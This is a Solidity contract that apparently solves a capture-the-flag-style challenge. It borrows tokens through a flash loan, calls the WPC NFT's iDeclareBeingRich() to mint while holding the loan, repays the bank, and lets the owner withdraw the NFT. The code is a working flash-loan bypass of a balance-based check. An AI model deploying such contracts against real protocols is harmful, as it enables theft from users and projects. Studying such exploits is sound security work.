//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

interface WPCInterface{
    function iDeclareBeingRich() external;
	  function safeTransferFrom(address from, address to, uint256 tokenId) external;
    }
interface BankTokenInterface{
    function transfer(address to, uint256 amount) external;
}

contract FlashloanBuyWPC{
    address fbank; 
    address btoken;
    address wpc;
    address owner;

    constructor(address bank, address token, address nft){
        fbank = bank;
        btoken = token;
        wpc = nft;
        owner = msg.sender;
    }

    //WPCInterface WPC = WPCInterface(wpc);
    //BankTokenInterface BankToken = BankTokenInterface(btoken);

    //execute the flashloan & get the nft, then send the loan back
    function executeWithMoney(uint256 amount) external{
    //require(amount >= 1000000*10**18, "The loan amount is not enough to mint WPC");
		WPCInterface(wpc).iDeclareBeingRich();   
		BankTokenInterface(btoken).transfer(fbank, amount); 
	}
	//transfer the WPC from this contract to my wallet address
	function transferWPC(uint256 nft_id) external{
		require(msg.sender == owner, "This is not your WPC");
		WPCInterface(wpc).safeTransferFrom(address(this), owner, nft_id);
	}
}
